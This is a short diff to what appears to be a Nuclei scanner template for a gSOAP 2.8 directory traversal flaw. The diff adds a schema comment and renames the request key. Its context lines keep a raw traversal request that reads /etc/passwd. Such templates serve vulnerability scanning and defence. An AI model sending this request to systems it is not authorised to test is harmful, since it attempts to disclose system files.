@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: gsoap-lfi
 info:
   name: gSOAP 2.8 - Directory Traversal
@@ -6,7 +7,7 @@ info:
   reference:
     - https://www.exploit-db.com/exploits/47653
   tags: gsoap,lfi
-requests:
+http:
   - raw:
       - |
         GET /../../../../../../../../../etc/passwd HTTP/1.1
